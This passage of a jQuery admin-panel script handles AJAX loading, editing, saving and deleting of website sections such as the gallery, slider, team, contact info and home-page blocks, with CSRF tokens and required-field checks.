    var CSRF_TOKEN = $('#csrf_token').val();
    var name = $("#visitor_c_name").val();
    var desc = $("#visitor_c_desc").val();
    var designation = $("#visitor_c_designation").val();
    var base_url = $("#base_url").val();
    fd.append('name', $('#visitor_c_name').val());
    fd.append('desc', $('#visitor_c_desc').val());
    fd.append('designation', $('#visitor_c_designation').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (name == '') {
        $("#visitor_c_name").focus();
        toastrErrorMsg("Name must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (desc == '') {
        $("#visitor_c_name").focus();
        toastrErrorMsg("Description must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (designation == '') {
        $("#visitor_c_designation").focus();
        toastrErrorMsg("Field must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "visitors-infoupdate",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#visitor_info").modal('hide');
            $("#visitor").modal('hide');
            getvisitors();
        }
    });
}
//    ============= its for teamgallery form ==============
"use strict";
function getteamgallery() {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $(".content-loder").show();
    $.ajax({
        url: base_url + "team-gallery",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".teamgallery_show").html(r);
        }
    });
}
"use strict";
function teamgallerytitle_edit(teammember_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "teamgallerytitle-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, teammember_id: teammember_id},
        success: function (r) {
            $(".modal_ttl").html("Team Gallery Information");
            $("#teamgallery").html(r);
            $("#teamgallery_info").modal('show');
        }
    });
}
"use strict";
function teamgalleryimage_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "teamgalleryimage-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Team Gallery Information");
            $("#teamgallery").html(r);
            $("#teamgallery_info").modal('show');
        }
    });
}
"use strict";
function teamgallery_title_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var name = $("#team_title_c_name").val();
    var designation = $("#team_title_c_designation").val();
    var base_url = $("#base_url").val();
    fd.append('name', $('#team_title_c_name').val());
    fd.append('designation', $('#team_title_c_designation').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (name == '') {
        $("#team_title_c_name").focus();
        toastrErrorMsg("Name must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (designation == '') {
        $("#team_title_c_designation").focus();
        toastrErrorMsg("Field must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "companies-title-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#team_c_name").val('');
            $("#teamgallery_info").modal('hide');
            $("#teamgallery").modal('hide');
            getteamgallery();
        }
    });
}
"use strict";
function teamgalleryimage_update(company_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var width = $("#team_width").val();
    var height = $("#team_height").val();
    var picture = $("#team_picture")[0].files[0];
    var base_url = $("#base_url").val();
    fd.append('width', width);
    fd.append('height', height);
    fd.append('picture', picture);
    fd.append('company_id', company_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (width == '') {
        $("#team_width").focus();
        toastrErrorMsg("Width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#team_height").focus();
        toastrErrorMsg("Height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "company-infoupdate",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#team_c_name").val('');
            $("#teamgallery_info").modal('hide');
            $("#teamgallery").modal('hide');
            getteamgallery();
        }
    });
}

//    ============= its for contactinfo us form ==============
"use strict";
function getcontactinfo() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "contact-info",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".contactinfo_show").html(r);
        }
    });
}
"use strict";
function contactinfotitle_edit(teammember_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "contactinfotitle-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, teammember_id: teammember_id},
        success: function (r) {
            $(".modal_ttl").html("Contact Information");
            $("#contactinfo").html(r);
            $("#contactinfo_info").modal('show');
        }
    });
}
"use strict";
function contactinfo_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "contactinfo-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Contact Information");
            $("#contactinfo").html(r);
            $("#contactinfo_info").modal('show');
        }
    });
}
"use strict";
function contactinfotitle_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var name = $("#contact_c_name").val();
    var designation = $("#contact_c_designation").val();
    var base_url = $("#base_url").val();
    fd.append('name', $('#contact_c_name').val());
    fd.append('designation', $('#contact_c_designation').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (name == '') {
        $("#contact_c_name").focus();
        toastrErrorMsg("Name must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (designation == '') {
        $("#contact_c_designation").focus();
        toastrErrorMsg("Field must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "companies-title-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#c_name").val('');
            $("#contactinfo_info").modal('hide');
            $("#contactinfo").modal('hide');
            getcontactinfo();
        }
    });
}
"use strict";
function contactinfo_infoupdate(company_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var width = $("#contact_width").val();
    var height = $("#contact_height").val();
    var base_url = $("#base_url").val();
    fd.append('width', width);
    fd.append('height', height);
    fd.append('company_id', company_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (width == '') {
        $("#contact_width").focus();
        toastrErrorMsg("Width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#contact_height").focus();
        toastrErrorMsg("Height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "contactinfo-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#c_name").val('');
            $("#contactinfo_info").modal('hide');
            $("#contactinfo").modal('hide');
            getcontactinfo();
        }
    });
}
//    ============= its for Gallery form ==============
"use strict";
function gallery_save() {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var name = $("#gallery_name").val();
    var width = $("#gallery_width").val();
    var height = $("#gallery_height").val();
    var picture = $("#gallery_picture")[0].files[0];
    var file = $('#gallery_picture').val().split('.').pop().toLowerCase();
    var base_url = $("#base_url").val();
    fd.append('name', name);
    fd.append('width', width);
    fd.append('height', height);
    fd.append('picture', picture);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (name == '') {
        $("#gallery_name").focus();
        toastrErrorMsg("name must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (width == '') {
        $("#gallery_width").focus();
        toastrErrorMsg("width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#gallery_height").focus();
        toastrErrorMsg("height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if($.inArray(file, ['gif','png','jpg','jpeg']) == -1) {
        toastrErrorMsg("Image is Required or Invalid");
        return false;
    }
    $.ajax({
        url: base_url + "gallery-save",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#gallery_name").val('');
            $("#gallery_height").val('');
            $("#gallery_width").val('');
            $("#gallery_picture").val('');
            getgallery();
        }
    });
}
"use strict";
function getgallery() {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $(".content-loder").show();
    $.ajax({
        url: base_url + "admin-gallery",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".gallery_show").html(r);
        }
    });
}
"use strict";
function gallery_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "gallery-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Gallery Information");
            $("#gallery").html(r);
            $("#gallery_info").modal('show');
        }
    });
}
"use strict";
function gallery_update(company_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var name = $("#gallerys_name").val();
    var width = $("#gallerys_width").val();
    var height = $("#gallerys_height").val();
    var picture = $("#gallerys_picture")[0].files[0];
    var base_url = $("#base_url").val();
    fd.append('name', name);
    fd.append('width', width);
    fd.append('height', height);
    fd.append('picture', picture);
    fd.append('company_id', company_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (name == '') {
        $("#gallerys_name").focus();
        toastrErrorMsg("name must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (width == '') {
        $("#gallerys_width").focus();
        toastrErrorMsg("width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#gallerys_height").focus();
        toastrErrorMsg("height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "gallery-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#name").val('');
            $("#gallery_info").modal('hide');
            $("#gallery").modal('hide');
            getgallery();
        }
    });
}
"use strict";
function gallerydelete(user_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
                return false;
    }
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    var r = confirm("Are you sure");
    if (r == true) {
        $.ajax({
            url: base_url + "delete-gallery/"+user_id,
            type: "post",
            data: {'csrf_test_name': CSRF_TOKEN, user_id: user_id},
            success: function (r) {
                toastr.success("<h5>Success</h5>Gallery Deleted");
                getgallery();
            }
        });
    }
}
//    ============= its for slider ==============
"use strict";
function getslider() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "slider",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".slider_show").html(r);
        }
    });
}

"use strict";
function sliderimage_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "sliderimage-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Slider Information");
            $("#slider").html(r);
            $("#slider_info").modal('show');
        }
    });
}
function slidertitle_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "slidertitle-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Slider Information");
            $("#slider").html(r);
            $("#slider_info").modal('show');
        }
    });
}
"use strict";
function slidertitle_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var title = $("#slider_title").val();
    var name = $("#c_name").val();
    var designation = $("#c_designation").val();
    var base_url = $("#base_url").val();
    fd.append('title', $('#slider_title').val());
    fd.append('name', $('#c_name').val());
    fd.append('designation', $('#c_designation').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (title == '') {
        $("#title").focus();
        toastrErrorMsg("Title must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (name == '') {
        $("#c_name").focus();
        toastrErrorMsg("Name must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (designation == '') {
        $("#c_designation").focus();
        toastrErrorMsg("Field must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "slidertitle-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#c_name").val('');
            $("#slider").modal('hide');
            $("#slider_info").modal('hide');
            getslider();
        }
    });
}
"use strict";
function sliderimage_update(company_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var width = $("#s_width").val();
    var height = $("#s_height").val();
    var picture = $("#s_picture")[0].files[0];
    var base_url = $("#base_url").val();
    fd.append('width', $("#s_width").val());
    fd.append('height', $("#s_height").val());
    fd.append('picture', picture);
    fd.append('company_id', company_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (width == '') {
        $("#s_width").focus();
        toastrErrorMsg("Width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#s_height").focus();
        toastrErrorMsg("Height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "sliderimage-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#slider").modal('hide');
            $("#slider_info").modal('hide');
            getslider();
        }
    });
}
"use strict";
function sliderimage_save() {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var width = $("#swidth").val();
    var height = $("#sheight").val();
    var picture = $("#spicture")[0].files[0];
    var base_url = $("#base_url").val();
    fd.append('width', $("#swidth").val());
    fd.append('height', $("#sheight").val());
    fd.append('picture', picture);
    var file2 = $('#spicture').val().split('.').pop().toLowerCase();
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (width == '') {
        $("#swidth").focus();
        toastrErrorMsg("Width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#sheight").focus();
        toastrErrorMsg("Height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if($.inArray(file2, ['gif','png','jpg','jpeg']) == -1) {
        toastrErrorMsg("Image is Required or Invalid");
        return false;
    }
    $.ajax({
        url: base_url + "sliderimage-save",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#swidth").val('');
            $("#sheight").val('');
            $("#spicture").val('');
            getslider();
        }
    });
}
"use strict";
function sliderdelete(user_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
                return false;
    }
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    var r = confirm("Are you sure");
    if (r == true) {
        $.ajax({
            url: base_url + "delete-slider/"+user_id,
            type: "post",
            data: {'csrf_test_name': CSRF_TOKEN, user_id: user_id},
            success: function (r) {
                toastr.success("<h5>Success</h5>Slider Deleted");
                getslider();
            }
        });
    }
}
//    ============= its for slider ==============
"use strict";
function getpromise() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "promise",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".promise_show").html(r);
        }
    });
}

"use strict";
function promiseimage_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "promiseimage-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Section 1 Information");
            $("#promise").html(r);
            $("#promise_info").modal('show');
        }
    });
}
function promisetitle_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "promisetitle-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Section 1 Information");
            $("#promise").html(r);
            $("#promise_info").modal('show');
        }
    });
}
"use strict";
function promisetitle_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var name = $("#promise_c_name").val();
    var designation = $("#promise_c_designation").val();
    var base_url = $("#base_url").val();
    fd.append('name', $('#promise_c_name').val());
    fd.append('designation', $('#promise_c_designation').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (name == '') {
        $("#promise_c_name").focus();
        toastrErrorMsg("Name must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (designation == '') {
        $("#promise_c_designation").focus();
        toastrErrorMsg("Field must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "promisetitle-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#c_name").val('');
            $("#promise").modal('hide');
            $("#promise_info").modal('hide');
            getpromise();
        }
    });
}
"use strict";
function promiseimage_update(company_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var width = $("#promise_width").val();
    var height = $("#promise_height").val();
    var picture = $("#promise_picture")[0].files[0];
    var base_url = $("#base_url").val();
    fd.append('width', $("#promise_width").val());
    fd.append('height', $("#promise_height").val());
    fd.append('picture', picture);
    fd.append('company_id', company_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (width == '') {
        $("#promise_width").focus();
        toastrErrorMsg("Width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#promise_height").focus();
        toastrErrorMsg("Height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "promiseimage-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#promise").modal('hide');
            $("#promise_info").modal('hide');
            getpromise();
        }
    });
}
//    ============= its for homeabout ==============
"use strict";
function gethomeabout() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "homeabout",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".homeabout_show").html(r);
        }
    });
}

"use strict";
function homeaboutimage_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "homeaboutimage-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Section 2 Information");
            $("#homeabout").html(r);
            $("#homeabout_info").modal('show');
        }
    });
}
function homeabouttitle_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "homeabouttitle-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Section 2 Information");
            $("#homeabout").html(r);
            $("#homeabout_info").modal('show');
        }
    });
}
"use strict";
function homeabouttitle_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var name = $("#homeabout_c_name").val();
    var designation = $("#homeabout_c_designation").val();
    var base_url = $("#base_url").val();
    fd.append('name', $('#homeabout_c_name').val());
    fd.append('designation', $('#homeabout_c_designation').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (name == '') {
        $("#homeabout_c_name").focus();
        toastrErrorMsg("Name must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (designation == '') {
        $("#homeabout_c_designation").focus();
        toastrErrorMsg("Field must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "homeabouttitle-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#homeabout_c_name").val('');
            $("#homeabout").modal('hide');
            $("#homeabout_info").modal('hide');
            $('[data-toggle="tooltip"]').tooltip();
            gethomeabout();
        }
    });
}
"use strict";
function homeaboutimage_update(company_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var width = $("#homeabout_width").val();
    var height = $("#homeabout_height").val();
    var picture = $("#homeabout_picture")[0].files[0];
    var base_url = $("#base_url").val();
    fd.append('width', $("#homeabout_width").val());
    fd.append('height', $("#homeabout_height").val());
    fd.append('picture', picture);
    fd.append('company_id', company_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (width == '') {
        $("#homeabout_width").focus();
        toastrErrorMsg("Width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#homeabout_height").focus();
        toastrErrorMsg("Height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "homeaboutimage-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#homeabout").modal('hide');
            $("#homeabout_info").modal('hide');
            gethomeabout();
        }
    });
}
//    ============= its for topoffer ==============
"use strict";
function gettopoffer() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "topoffer",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".topoffer_show").html(r);
        }
    });
}

"use strict";
function topofferimage_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "topofferimage-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Section 3 Information");
            $("#topoffer").html(r);
            $("#topoffer_info").modal('show');
        }
    });
}
function topoffertitle_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "topoffertitle-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Section 3 Information");
            $("#topoffer").html(r);
            $("#topoffer_info").modal('show');
        }
    });
}
"use strict";
function topoffertitle_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var name = $("#topoffer_c_name").val();
    var designation = $("#topoffer_c_designation").val();
    var base_url = $("#base_url").val();
    fd.append('name', $('#topoffer_c_name').val());
    fd.append('designation', $('#topoffer_c_designation').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (name == '') {
        $("#topoffer_c_name").focus();
        toastrErrorMsg("Name must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (designation == '') {
        $("#topoffer_c_designation").focus();
        toastrErrorMsg("Field must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "topoffertitle-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#topoffer_c_name").val('');
            $("#topoffer").modal('hide');
            $("#topoffer_info").modal('hide');
            gettopoffer();
        }
    });
}
"use strict";
function topofferimage_update(company_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var title = $("#topoffer_title").val();
    var width = $("#topoffer_width").val();
    var height = $("#topoffer_height").val();
    var link = $("#topoffer_link").val();
    var picture = $("#topoffer_picture")[0].files[0];
    var base_url = $("#base_url").val();
    fd.append('title', $("#topoffer_title").val());
    fd.append('width', $("#topoffer_width").val());
    fd.append('height', $("#topoffer_height").val());
    fd.append('link', $("#topoffer_link").val());
    fd.append('picture', picture);
    fd.append('company_id', company_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (title == '') {
        $("#topoffer_title").focus();
        toastrErrorMsg("Title must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (width == '') {
        $("#topoffer_width").focus();
        toastrErrorMsg("Width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#topoffer_height").focus();
        toastrErrorMsg("Height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (link == '') {
        $("#topoffer_link").focus();
        toastrErrorMsg("Link must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "topofferimage-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
